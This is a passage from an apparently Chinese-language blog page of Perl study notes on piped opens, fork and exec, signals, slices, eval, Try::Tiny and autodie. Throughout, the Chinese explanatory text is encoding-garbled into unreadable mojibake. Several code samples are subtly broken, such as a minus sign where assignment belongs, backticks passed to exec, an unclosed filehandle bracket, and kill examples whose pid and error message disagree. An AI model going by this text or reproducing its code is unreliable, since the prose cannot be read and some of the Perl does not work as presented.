åœ¨å·¦è¾¹è¡¨ç¤ºè¯¥å‘½ä»¤çš„æ ‡å‡†è¾“å…¥è¿æ¥åˆ° <code>MAIL</code>.</p><p>ä¸‰ä¸ªå‚æ•°çš„å½¢å¼å¦‚ä¸‹:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">open</span> <span class="hljs-keyword">my</span> $date_fh, <span class="hljs-string">&#x27;-|&#x27;</span>, <span class="hljs-string">&#x27;date&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span> <span class="hljs-string">&quot;cannot pipe from date: $!&quot;</span>;<br><span class="hljs-keyword">open</span> <span class="hljs-keyword">my</span> $mail_fh, <span class="hljs-string">&#x27;|-&#x27;</span>, <span class="hljs-string">&#x27;mail merlyn&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span> <span class="hljs-string">&quot;cannot pipe to mail: $!&quot;</span>;<br></code></pre></td></tr></table></figure><p><code>-</code> çš„ä½ç½®æ›¿ä»£äº†åŸæ¥çš„ <code>command</code>.</p><p>ä¹Ÿå¯ä¸‰ä¸ªä»¥ä¸Šçš„å‚æ•°:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">open</span> <span class="hljs-keyword">my</span> $mail_fh, <span class="hljs-string">&#x27;|-&#x27;</span>, <span class="hljs-string">&#x27;mail&#x27;</span>, <span class="hljs-string">&#x27; merlyn&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span> <span class="hljs-string">&quot;cannot pipe to mail: $!&quot;</span>;<br></code></pre></td></tr></table></figure><p>ä»ä»¥è¯»å–æ¨¡å¼æ‰“å¼€çš„æ–‡ä»¶å¥æŸ„ä¸­è¯»å–æ•°æ®:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $now = &lt;$date_fh&gt;;<br></code></pre></td></tr></table></figure><p>å‘é€æ•°æ®åˆ° mail è¿›ç¨‹:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">print</span> $mail_fh <span class="hljs-string">&quot;The time is now $now&quot;</span>;<br></code></pre></td></tr></table></figure><p>ç»“æŸ:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">close</span> $mail_fh;<br><span class="hljs-keyword">die</span> <span class="hljs-string">&quot;mail: non-zero exit of $?&quot;</span> <span class="hljs-keyword">if</span> $?;<br></code></pre></td></tr></table></figure><p>é€€å‡ºçŠ¶æ€ä¿å­˜åœ¨ <code>$?</code> ä¸­.</p><h2 id="ç”¨-fork-è¿›è¡Œæ·±å…¥å’Œå¤æ‚å·¥ä½œ"><a href="#ç”¨-fork-è¿›è¡Œæ·±å…¥å’Œå¤æ‚å·¥ä½œ" class="headerlink" title="ç”¨ fork è¿›è¡Œæ·±å…¥å’Œå¤æ‚å·¥ä½œ"></a>ç”¨ fork è¿›è¡Œæ·±å…¥å’Œå¤æ‚å·¥ä½œ</h2><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">system</span> <span class="hljs-string">&#x27;date&#x27;</span>;<br></code></pre></td></tr></table></figure><p>è¿™æ¡è¯­å¥çš„ä½çº§å®ç°:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">defined</span>(<span class="hljs-keyword">my</span> $pid = <span class="hljs-keyword">fork</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span> <span class="hljs-string">&quot;Cannot fork: $!&quot;</span>;<br><span class="hljs-keyword">unless</span> ($pid) &#123;<br>    <span class="hljs-keyword">exec</span> <span class="hljs-string">`date`</span>;<br>    <span class="hljs-keyword">die</span> <span class="hljs-string">&quot;cannot exec date: $!&quot;</span>;<br>&#125;<br><span class="hljs-keyword">waitpid</span>($pid, <span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure><p><code>fork</code> è°ƒç”¨æˆåŠŸä¼šè¿”å›ä¸€ä¸ª <code>pid</code>, å¤±è´¥è¿”å› <code>undef</code>.</p><p><code>waitpid</code> ç”¨äºç­‰å¾…ç‰¹å®šçš„å­è¿›ç¨‹ç»“æŸ.</p><p>æ·±å…¥äº†è§£å¯ä»¥æŸ¥çœ‹ <code>perlipc</code> æ–‡æ¡£.</p><h2 id="å‘é€åŠæ¥æ”¶ä¿¡å·"><a href="#å‘é€åŠæ¥æ”¶ä¿¡å·" class="headerlink" title="å‘é€åŠæ¥æ”¶ä¿¡å·"></a>å‘é€åŠæ¥æ”¶ä¿¡å·</h2><h3 id="å‘é€ä¿¡å·"><a href="#å‘é€ä¿¡å·" class="headerlink" title="å‘é€ä¿¡å·"></a>å‘é€ä¿¡å·</h3><p>åœ¨ Linux ä¸­å¯ä»¥ç”¨ <code>kill -l</code> åˆ—å‡ºæ‰€æœ‰çš„ä¿¡å·.</p><p>åœ¨ Perl ä¸­ä½¿ç”¨ <code>kill</code> å‘é€ä¿¡å·:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">kill</span> <span class="hljs-number">2</span>, <span class="hljs-number">4200</span> <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span> <span class="hljs-string">&quot;Cannot signal 4021 with SIGINT: $!&quot;</span>;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œçš„ <code>2</code> æ˜¯ä¿¡å·, ä¹Ÿå¯ä»¥ç”¨åç§°å¦‚ <code>INT</code>, <code>4022</code> æ˜¯ pid:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">kill</span> <span class="hljs-string">&#x27;INT&#x27;</span>, <span class="hljs-number">4200</span> <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span> <span class="hljs-string">&quot;Cannot signal 4021 with SIGINT: $!&quot;</span>;<br></code></pre></td></tr></table></figure><p>å¯ä»¥ä½¿ç”¨ <code>=&gt;</code>, è¿™æ ·ä¿¡å·åç§°ä¸ç”¨è¢«å•å¼•å·åŒ…è£¹, å…¶ä¼šè‡ªåŠ¨ä½œä¸ºè£¸å­—ç¬¦ä¸²:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">kill</span> <span class="hljs-string">INT =&gt;</span> <span class="hljs-number">4200</span> <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span> <span class="hljs-string">&quot;Cannot signal 4021 with SIGINT: $!&quot;</span>;<br></code></pre></td></tr></table></figure><p>ç¼–å·ä¸º <code>0</code> çš„ç‰¹æ®Šä¿¡å·è¡¨ç¤º, å°è¯•æ˜¯å¦èƒ½å‘è¿™ä¸ªè¿›ç¨‹å‘é€ä¿¡å·. å¯ç”¨äºæ¢æµ‹è¿›ç¨‹æ˜¯å¦å­˜æ´»:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">unless</span> (<span class="hljs-keyword">kill</span> <span class="hljs-number">0</span>, $pid) &#123;<br>    <span class="hljs-keyword">warn</span> <span class="hljs-string">&quot;$pid has gone away&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="æ¥æ”¶ä¿¡å·"><a href="#æ¥æ”¶ä¿¡å·" class="headerlink" title="æ¥æ”¶ä¿¡å·"></a>æ¥æ”¶ä¿¡å·</h3><p>ä¹Ÿå°±æ˜¯å¤„ç†å‘è¿™ä¸ªç¨‹åºå‘é€çš„ä¿¡å·.</p><p>å¯¹ç‰¹æ®Šå“ˆå¸Œ <code>%SIG</code> èµ‹å€¼ä¼šå¯åŠ¨ä¿¡å·å¤„ç†ç¨‹åº (ç›´åˆ°æ’¤é”€ä¸ºæ­¢). å“ˆå¸Œå€¼æ˜¯å­ç¨‹åºå (è¿™é‡Œä¸åŠ  <code>&amp;</code> å·). å¦‚:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $temp_directory = <span class="hljs-string">&quot;/tmp/myprog.$$&quot;</span>;<br><span class="hljs-keyword">mkdir</span> $temp_directory, <span class="hljs-number">0700</span> <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span> <span class="hljs-string">&quot;Cannot create $temp_directory&quot;</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">clean_up</span> </span>&#123;<br>    <span class="hljs-keyword">unlink</span> <span class="hljs-keyword">glob</span> <span class="hljs-string">&quot;$temp_directory/*&quot;</span>;<br>    <span class="hljs-keyword">rmdir</span> $temp_directory;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">my_int_handler</span> </span>&#123;<br>    &amp;clean_up();<br>    <span class="hljs-keyword">die</span> <span class="hljs-string">&quot;interrupted, exiting...\n&quot;</span>;<br>&#125;<br><br>$SIG&#123;<span class="hljs-string">&#x27;INT&#x27;</span>&#125; = <span class="hljs-string">&#x27;my_int_handler&#x27;</span>;<br>.<br>.<br>.<br>&amp;clean_up;<br></code></pre></td></tr></table></figure><p>è®¾ç½®æ ‡è®°:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $int_count = <span class="hljs-number">0</span>;<br><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">my_int_handler</span> </span>&#123; $int_count++ &#125;;<br>$SIG&#123;<span class="hljs-string">&#x27;INT&#x27;</span>&#125; = <span class="hljs-string">&#x27;my_int_handler&#x27;</span>;<br>...;<br><span class="hljs-keyword">while</span> (&lt;SOMEFILE) &#123;<br>    ...;<br>    <span class="hljs-keyword">if</span> ($int_count) &#123;<br>        <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;[processing interrupted...]\n&quot;</span>;<br>        <span class="hljs-keyword">last</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="ç¬¬åä¸ƒç« -é«˜çº§-Perl-æŠ€å·§"><a href="#ç¬¬åä¸ƒç« -é«˜çº§-Perl-æŠ€å·§" class="headerlink" title="ç¬¬åä¸ƒç«  é«˜çº§ Perl æŠ€å·§"></a>ç¬¬åä¸ƒç«  é«˜çº§ Perl æŠ€å·§</h1><h2 id="åˆ‡ç‰‡"><a href="#åˆ‡ç‰‡" class="headerlink" title="åˆ‡ç‰‡"></a>åˆ‡ç‰‡</h2><p>åˆ—è¡¨åˆ‡ç‰‡, å°±æ˜¯å¯ä»¥ç”¨ç´¢å¼•å–å¾—åˆ—è¡¨ä¸­çš„å€¼ (æŠŠåˆ—è¡¨å½“ä½œæ•°ç»„ä½¿ç”¨):</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $mtime = (<span class="hljs-keyword">stat</span> $some_file)[<span class="hljs-number">9</span>];<br></code></pre></td></tr></table></figure><p>è¿™é‡Œçš„åœ†æ‹¬å·æ˜¯å¿…é¡»çš„.</p><p>ä¸€æ¬¡å–ä¸€ä¸ªå€¼, å¦‚:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $card_num = (<span class="hljs-keyword">split</span> <span class="hljs-regexp">/:/</span>)[<span class="hljs-number">1</span>];<br><span class="hljs-keyword">my</span> $count = (<span class="hljs-keyword">split</span> <span class="hljs-regexp">/:/</span>)[<span class="hljs-number">5</span>];<br></code></pre></td></tr></table></figure><p>ä¸€æ¬¡å–ä¸¤ä¸ªå€¼, å¦‚:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span>($card_num, $count) = (<span class="hljs-keyword">split</span> <span class="hljs-regexp">/:/</span>)[<span class="hljs-number">1</span>, <span class="hljs-number">5</span>];<br></code></pre></td></tr></table></figure><p>å¯ä»¥ç”¨ <code>-1</code> ä»£è¡¨æœ€åä¸€ä¸ªå…ƒç´ .</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> @numbers = (@name)[<span class="hljs-number">9</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>];<br></code></pre></td></tr></table></figure><h3 id="æ•°ç»„åˆ‡ç‰‡-array-slice"><a href="#æ•°ç»„åˆ‡ç‰‡-array-slice" class="headerlink" title="æ•°ç»„åˆ‡ç‰‡ (array slice)"></a>æ•°ç»„åˆ‡ç‰‡ (array slice)</h3><p>ä»æ•°ç»„ä¸­åˆ‡å‡ºå…ƒç´ æ—¶ä¸éœ€è¦åœ†æ‹¬å·, ä¸Šé¢æ”¹ä¸º:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> @numbers = @name[<span class="hljs-number">9</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>];<br></code></pre></td></tr></table></figure><p>Perl ä¸­ <code>$</code> ç¬¦å·æ„å‘³ç€ä¸€ä¸ªä¸œè¥¿, è€Œ <code>@</code> ç¬¦å·æ„å‘³ç€ä¸€ç»„ä¸œè¥¿.</p><p>ä»¥ Perl çš„ä¹ æƒ¯æ¥çœ‹å¼€å¤´çš„ç¬¦å·å’Œç»“å°¾çš„æ–¹æ‹¬å·, æ–¹æ‹¬å·æ„å‘³ç€ä½ è¦æ£€ç´¢æ•°ç»„æˆå‘˜, <code>@</code> ç¬¦å·æ„å‘³ç€è·å–æ•´ä¸ªåˆ—è¡¨, <code>$</code> ç¬¦å·æ„å‘³ç€å–å•ä¸ªå…ƒç´ .</p><p>å¦‚æœå‰é¢æœ‰ä¸ª <code>$</code> ç¬¦å·, ä¸‹æ ‡è¡¨è¾¾å¼å°±ä¼šåœ¨æ ‡é‡ä¸Šä¸‹æ–‡ä¸­æ±‚å¾—ç´¢å¼•å€¼, ä½†å¦‚æœä¹‹å‰æœ‰ä¸ª <code>@</code> ç¬¦å·çš„è¯, ä¸‹è¡¨è¡¨è¾¾å¼å°±ä¼šåœ¨åˆ—è¡¨ä¸Šä¸‹æ–‡ä¸­è®¡ç®—</p><p>åˆ‡ç‰‡å¯ä»¥ç›´æ¥å†…æ’åˆ°å­—ç¬¦ä¸²ä¸­.</p><p>åˆ—è¡¨çš„å…ƒç´ ä¼šè¢« Perl å†…ç½®çš„ <code>$&quot;</code> å˜é‡çš„å†…å®¹å¡«å……, è€Œå®ƒçš„é»˜è®¤å€¼å°±æ˜¯ç©ºæ ¼, ä¸€èˆ¬ä¸åº”æ”¹å˜. å†…æ’æ—¶, Perl å®é™…ä¸Šä¼šæ‰§è¡Œ <code>join $&quot;,@list</code>.</p><p>ä¿®æ”¹æ•°ç»„ä¸­çš„å…ƒç´ :</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $new_home_phone = <span class="hljs-string">&quot;555-6099&quot;</span>;<br><span class="hljs-keyword">my</span> $new_address = <span class="hljs-string">&quot;99380 Red Rock West&quot;</span>;<br>@items[<span class="hljs-number">2</span>, <span class="hljs-number">3</span>] = ($new_address, $new_home_phone);<br></code></pre></td></tr></table></figure><h3 id="å“ˆå¸Œåˆ‡ç‰‡-hash-slice"><a href="#å“ˆå¸Œåˆ‡ç‰‡-hash-slice" class="headerlink" title="å“ˆå¸Œåˆ‡ç‰‡ (hash slice)"></a>å“ˆå¸Œåˆ‡ç‰‡ (hash slice)</h3><p>åˆ‡ç‰‡ä¸€å®šæ˜¯åˆ—è¡¨, å› æ­¤å“ˆå¸Œåˆ‡ç‰‡ä¹Ÿæ˜¯ç”¨ <code>@</code> ç¬¦å·æ¥è¡¨ç¤º.</p><p>åœ¨ Perl ä¸­çœ‹åˆ°ç±»ä¼¼ <code>@score&#123;...&#125;</code> çš„å†™æ³•, ç”¨ Perl çš„ä¹ æƒ¯æ¥çœ‹å°±æ˜¯, èŠ±æ‹¬å·æ„å‘³ç€ä½ è¦æ£€ç´¢å“ˆå¸Œæˆå‘˜, <code>@</code> ç¬¦å·æ„å‘³ç€è·å–çš„æ˜¯æ•´ä¸ªåˆ—è¡¨.</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> @three_scores = ($score&#123;<span class="hljs-string">&quot;barney&quot;</span>&#125;, $score&#123;<span class="hljs-string">&quot;fred&quot;</span>&#125;, $score&#123;<span class="hljs-string">&quot;dino&quot;</span>&#125;);<br><span class="hljs-keyword">my</span> @three_scores = @score&#123; <span class="hljs-keyword">qw</span>/barney fred dino/ &#125;;<br></code></pre></td></tr></table></figure><p>ç™¾åˆ†å·ç¬¦å·è¡¨ç¤ºçš„æ˜¯æ•´ä¸ªå“ˆå¸Œ, å“ˆå¸Œåˆ‡ç‰‡ä¸€å®šæ˜¯åˆ—è¡¨è€Œä¸ä¸€å®šæ˜¯æ•´ä¸ªå“ˆå¸Œ.</p><h2 id="æ•è·é”™è¯¯"><a href="#æ•è·é”™è¯¯" class="headerlink" title="æ•è·é”™è¯¯"></a>æ•è·é”™è¯¯</h2><p>å¯å‚é˜… &lt;<Mastering Perl>&gt;</p><h3 id="ä½¿ç”¨-eval"><a href="#ä½¿ç”¨-eval" class="headerlink" title="ä½¿ç”¨ eval"></a>ä½¿ç”¨ eval</h3><p>æŠŠä»£ç åŒ…è£¹åœ¨ <code>eval</code> å—ä¸­.</p><p><code>eval</code> å—åªæ˜¯ä¸€ä¸ªè¡¨è¾¾å¼, è¦åœ¨ç»“å°¾åŠ  <code>;</code></p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">eval</span> &#123; $barney = $fred / $dino &#125;;<br></code></pre></td></tr></table></figure><p>åªè¦ <code>eval</code> å‘ç°åœ¨å®ƒçš„ç›‘å¯ŸèŒƒå›´å†…å‡ºç°è‡´å‘½é”™è¯¯, å°±ä¼šç«‹å³åœæ­¢è¿è¡Œæ•´ä¸ªå—, é€€å‡ºåç»§ç»­è¿è¡Œå…¶ä½™ä»£ç .</p><p>å’Œå­ç¨‹åºç›¸åŒ, <code>eval</code> çš„è¿”å›å€¼æ˜¯è¯­å¥å—ä¸­æœ€åä¸€æ¡è¡¨è¾¾å¼çš„æ‰§è¡Œç»“æœ.</p><p>å¦‚æœ <code>eval</code> æ•è·åˆ°äº†é”™è¯¯, é‚£ä¹ˆæ•´ä¸ªè¯­å¥å—å°†è¿”å› <code>undef</code>. å¹¶ä¸”åœ¨ç‰¹æ®Šå˜é‡ <code>$@</code> ä¸­è®¾ç½®é”™è¯¯æ¶ˆæ¯.</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> <span class="hljs-number">5.010</span>;<br><span class="hljs-keyword">my</span> $barney - <span class="hljs-keyword">eval</span> &#123; $fred / $dino &#125; // <span class="hljs-string">&#x27;NaN&#x27;</span>; <br><span class="hljs-keyword">print</span> <span class="hljs-string">&quot;I couldn&#x27;t divide by \$dino: $@&quot;</span> <span class="hljs-keyword">if</span> $@;<br></code></pre></td></tr></table></figure><p>å¯ä»¥æ„é€ ä¸€ä¸ªæœ‰è¿”å›å€¼çš„ä»£ç å—:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">unless</span> ( <span class="hljs-keyword">eval</span> &#123; some_sub(); <span class="hljs-number">1</span> &#125; ) &#123;<br>    <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;I couldn&#x27;t divide by \$dino: $@&quot;</span> <span class="hljs-keyword">if</span> $@;<br>&#125;<br></code></pre></td></tr></table></figure><p>åœ¨åˆ—è¡¨ä¸Šä¸‹æ–‡ä¸­, æ•è·åˆ°é”™è¯¯çš„ <code>eval</code> ä¼šè¿”å›ç©ºåˆ—è¡¨.</p><p><code>eval</code> å—å¯ä»¥è®¾å®š <code>my</code> å˜é‡çš„æ–°ä½œç”¨åŸŸ, å—å†…çš„è¯­å¥æ•°ç›®ä¸é™:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">foreach</span> <span class="hljs-keyword">my</span> $person (<span class="hljs-keyword">qw</span>/ fred wilma betty barney dino pebbles /) &#123;<br>    <span class="hljs-keyword">eval</span> &#123;<br>        <span class="hljs-keyword">open</span> <span class="hljs-keyword">my</span> $fh, <span class="hljs-string">&#x27;&lt;&#x27;</span>, $person<br>            <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span> <span class="hljs-string">&quot;Can&#x27;t open file &#x27;$person&#x27;: $!&quot;</span>;<br><br>        <span class="hljs-keyword">my</span>($total, $count);<br><br>        <span class="hljs-keyword">while</span> (&lt;$fh&gt;) &#123;<br>            $total += $_;<br>            $count++;<br>        &#125;<br><br>        <span class="hljs-keyword">my</span> $average = $total / $count;<br>        <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;Average for file $person was $average\n&quot;</span>;<br><br>        $do_something($person, $average);<br>    &#125;;<br><br>    <span class="hljs-keyword">if</span> ($@) &#123;<br>        <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;An error occurred ($@), continuing\n&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å¯ä»¥åµŒå¥—ä½¿ç”¨ <code>eval</code>, å†…å±‚çš„ <code>eval</code> é€šè¿‡ <code>die</code> å‘å¤–å±‚æŠ¥å‘Š.</p><p>æœ‰ 4 ä¸­ç±»å‹çš„é”™è¯¯æ˜¯ <code>eval</code> æ— æ³•æ•è·çš„:</p><ul><li>è¯­æ³•é”™è¯¯, å¦‚å¿˜å†™åˆ†å· <code>;</code> (perl è§£é‡Šå™¨çš„ç¼–è¯‘å™¨ä¼šåœ¨è§£ææºä»£ç æ—¶æ•è·è¿™ç±»é”™è¯¯å¹¶åœ¨è¿è¡Œç¨‹åºå‰åœä¸‹æ¥, è€Œ eval ä»…ä»…èƒ½æ•è· Perl è¿è¡Œæ—¶å‡ºç°çš„é”™è¯¯)</li><li>è®© perl è§£é‡Šå™¨æœ¬èº«å´©æºƒçš„é”™è¯¯, å¦‚å†…å­˜æº¢å‡º (å…¶ä¼šè®© perl è§£é‡Šå™¨æ„å¤–ç»ˆæ­¢)</li><li>æ— æ³•æ•è·è­¦å‘Š</li><li>ç”¨ <code>exit</code> é€€å‡º</li></ul><h2 id="æ›´ä¸ºé«˜çº§çš„é”™è¯¯å¤„ç†"><a href="#æ›´ä¸ºé«˜çº§çš„é”™è¯¯å¤„ç†" class="headerlink" title="æ›´ä¸ºé«˜çº§çš„é”™è¯¯å¤„ç†"></a>æ›´ä¸ºé«˜çº§çš„é”™è¯¯å¤„ç†</h2><p>ç”¨ <code>die</code> æŠ›å‡ºå¼‚å¸¸, ç”¨ <code>eval</code> æ•è·å¼‚å¸¸.</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs perl">&#123;<br><span class="hljs-keyword">local</span> $@;<br><br><span class="hljs-keyword">eval</span> &#123;<br>    ...;<br>    <span class="hljs-keyword">die</span> <span class="hljs-string">&quot;An unexpected exception message&quot;</span> <span class="hljs-keyword">if</span> $unexpected;<br>    <span class="hljs-keyword">die</span> <span class="hljs-string">&quot;Bad denominator&quot;</span> <span class="hljs-keyword">if</span> $dino;<br>&#125;;<br><br><span class="hljs-keyword">if</span> ($@ =~ <span class="hljs-regexp">/unexpected/</span>) &#123;<br>    ...;<br>&#125; <span class="hljs-keyword">elsif</span> ($@ =~ <span class="hljs-regexp">/denominator/</span>) &#123;<br>    ...; <br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨ Try::Tiny æ¨¡å—, å…¶ä¸æ˜¯å†…ç½®æ¨¡å—:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> Try::Tiny;<br><br>try &#123;<br>    ...; <span class="hljs-comment"># å¯èƒ½ä¼šæŠ›å‡ºå¼‚å¸¸çš„ä»£ç </span><br>&#125;<br>catch &#123;<br>    ...; <span class="hljs-comment"># æŸäº›å¤„ç†å¼‚å¸¸çš„ä»£ç </span><br>&#125;<br>finally &#123;<br>    ...;<br>&#125;<br></code></pre></td></tr></table></figure><p>å¯çœç•¥ <code>catch</code> å’Œ <code>finally</code> å—. åªç”¨ <code>try</code> æ¥å¿½ç•¥é”™è¯¯:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $barney = try &#123;$fred / $dino&#125;;<br></code></pre></td></tr></table></figure><p>Try::Tiny æŠŠé”™è¯¯æ¶ˆæ¯æ”¾åˆ°äº†é»˜è®¤å˜é‡ <code>$_</code>.</p><h2 id="autodie"><a href="#autodie" class="headerlink" title="autodie"></a>autodie</h2><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> autodie;<br><span class="hljs-keyword">open</span> <span class="hljs-keyword">my</span> $fh, <span class="hljs-string">&#x27;&gt;&#x27;</span>, $filename; <span class="hljs-comment"># åœ¨å‘ç”Ÿé”™è¯¯æ—¶ä»ä¼šè°ƒç”¨ die å‡½æ•°</span><br></code></pre></td></tr></table></figure><p><code>autodie</code> æ¨¡å—é»˜è®¤ä¼šå¯¹ä¸€ç³»åˆ— Perl å†…ç½®çš„ç”¨äºå¤„ç†æ–‡ä»¶, æ–‡ä»¶å¥æŸ„, è¿›ç¨‹é—´é€šä¿¡å’Œå¥—æ¥å­—çš„å‡½æ•°è‡ªåŠ¨æ–½è¡Œç›‘ç®¡, ä¹Ÿå¯ä»¥æŒ‡å®š:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> autodie <span class="hljs-string">qw( open system :socket )</span>;<br></code></pre></td></tr></table></figure><p><code>autodie</code> æŠ›å‡ºé”™è¯¯æ—¶, å®ƒä¼šæŠŠä¸€ä¸ª <code>autodie::exception</code> å¯¹è±¡æ”¾åˆ° <code>$@</code> å˜é‡ä¸­.</p><h2 id="ç”¨-grep-ç­›é€‰åˆ—è¡¨"><a href="#ç”¨-grep-ç­›é€‰åˆ—è¡¨" class="headerlink" title="ç”¨ grep ç­›é€‰åˆ—è¡¨"></a>ç”¨ grep 